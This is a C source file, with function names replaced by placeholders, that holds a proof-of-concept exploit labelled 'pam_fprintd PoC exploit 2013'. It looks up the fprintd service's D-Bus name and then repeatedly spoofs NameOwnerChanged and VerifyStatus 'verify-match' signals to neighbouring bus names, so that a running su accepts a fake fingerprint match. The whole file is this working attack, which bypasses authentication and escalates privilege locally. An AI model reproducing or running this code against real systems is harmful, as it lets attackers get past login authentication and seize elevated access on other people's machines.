#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_7__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  dest ;
typedef  int /*<<< orphan*/  dbus_uint32_t ;
typedef  int dbus_bool_t ;
struct TYPE_7__ {char* message; } ;
typedef  int /*<<< orphan*/  DBusMessage ;
typedef  TYPE_1__ DBusError ;
typedef  int /*<<< orphan*/  DBusConnection ;

/* Variables and functions */
 int /*<<< orphan*/  DBUS_BUS_SYSTEM ; 
 int /*<<< orphan*/  DBUS_TYPE_BOOLEAN ; 
 int /*<<< orphan*/  DBUS_TYPE_INVALID ; 
 int /*<<< orphan*/  DBUS_TYPE_STRING ; 
 int FUNC0 (scalar_t__) ; 
 int /*<<< orphan*/ * FUNC1 (int /*<<< orphan*/ ,TYPE_1__*) ; 
 char* FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC5 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int,TYPE_1__*) ; 
 int /*<<< orphan*/  FUNC6 (TYPE_1__*) ; 
 scalar_t__ FUNC7 (TYPE_1__*) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,char const**,int /*<<< orphan*/ ,...) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ *,TYPE_1__*,int /*<<< orphan*/ ,char const**,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/ * FUNC10 (char*,char*,char*,char*) ; 
 int /*<<< orphan*/ * FUNC11 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,...) ; 
 int /*<<< orphan*/  FUNC17 (char*,int,char*,int) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC18 (char const*,char) ; 
 char* FUNC19 (char*) ; 
 int /*<<< orphan*/  FUNC20 (int) ; 

int FUNC21(int argc, char **argv)
{
  DBusError err;
  DBusConnection *conn = NULL;
  DBusMessage *vrfy_msg = NULL, *noc_msg = NULL, *nl_msg = NULL, *reply = NULL;
  dbus_uint32_t serial = 0;
  dbus_bool_t t = 1;
  int un = 0, i = 0, reply_to = -1;
  const char *vrfy_match = "verify-match", *cname = NULL,
             *name = "net.reactivated.Fprint", *prev_owner = NULL;
  char dest[32];

  /* override unique name of net.reactivated.Fprint */
  if (argc > 1)
    prev_owner = FUNC19(argv[1]);

  FUNC16("\n[**] darklena, pam_fprintd PoC exploit 2013\n\n");

  FUNC16("[*] Initializing DBUS ...\n");
  FUNC6(&err);
  conn = FUNC1(DBUS_BUS_SYSTEM, &err);

  if (FUNC7(&err)) {
    FUNC15(stderr, "Error: %s\n", err.message);
    FUNC14("dbus_error_is_set");
  }

  if ((cname = FUNC2(conn)) == NULL)
    FUNC14("dbus_bus_get_unique_name");

  un = FUNC0(FUNC18(cname, '.') + 1);

  FUNC16("[+] Done. Found my unique name: %s (%d)\n", cname, un);

  if (!prev_owner) {
    FUNC16("[*] Trying to find unique name of '%s' ...\n", name);
    nl_msg = FUNC10("org.freedesktop.DBus",
                                          "/org/freedesktop/DBus",
                                            "org.freedesktop.DBus",
                                          "GetNameOwner");

    if (!FUNC8(nl_msg, DBUS_TYPE_STRING, &name, DBUS_TYPE_INVALID))
      FUNC14("[-] dbus_message_append_args");

    reply = FUNC5(conn, nl_msg, reply_to, &err);
    FUNC13(nl_msg);

    if (FUNC7(&err)) {
      FUNC15 (stderr, "[-] Error: %s\n", err.message);
      FUNC14("[-] dbus_connection_send_with_reply_and_block");
    }

    if (!FUNC9(reply, &err,
                               DBUS_TYPE_STRING, &prev_owner, DBUS_TYPE_INVALID)) {
      FUNC15(stderr, "[-] Error: %s\n", err.message);
      FUNC14("[-] dbus_message_get_args");
    }

    FUNC13(reply);
  }

  FUNC16("[+] Found unique name of '%s' as '%s'\n", name, prev_owner);

  for (i = 1; i < 20; ++i) {
    /* spoof a NameOwnerChanged signal */
    noc_msg = FUNC11("/org/freedesktop/DBus",
                                      "org.freedesktop.DBus",
                                      "NameOwnerChanged");

    /* spoof a VerifyStatus */
    vrfy_msg = FUNC11("/net/reactivated/Fprint/Device/0",
                                             "net.reactivated.Fprint.Device",
                                             "VerifyStatus");

    if (!vrfy_msg || !noc_msg)
      FUNC14("[-] dbus_message_new_signal");

    if (!FUNC8(noc_msg, DBUS_TYPE_STRING, &name, DBUS_TYPE_STRING,
                                  &prev_owner, DBUS_TYPE_STRING, &cname, DBUS_TYPE_INVALID))
      FUNC14("[-] dbus_message_append_args1");

    if (!FUNC8(vrfy_msg, DBUS_TYPE_STRING, &vrfy_match,
                                  DBUS_TYPE_BOOLEAN, &t, DBUS_TYPE_INVALID))
      FUNC14("[-] dbus_message_append_args2");

    /* iterate over unique names short below under our own
     * to hit the previously started su
     */
    FUNC17(dest, sizeof(dest), ":1.%d", un - i);
    FUNC16("[*] Using new destination: %s\n", dest);

    if (!FUNC12(vrfy_msg, dest))
      FUNC14("[-] dbus_message_set_destination");

    if (!FUNC12(noc_msg, dest))
      FUNC14("[-] dbus_message_set_destination");

    if (!FUNC4(conn, noc_msg, &serial))
      FUNC14("[-] dbus_connection_send");

    FUNC3(conn);
    FUNC20(1000);

    if (!FUNC4(conn, vrfy_msg, &serial))
      FUNC14("[-] dbus_connection_send");

    FUNC3(conn);

    FUNC13(vrfy_msg);
    FUNC13(noc_msg);
  }

  FUNC16("\n[**] Here comes the pain! (but no one's to too innocent to die)\n");
  return 0;
}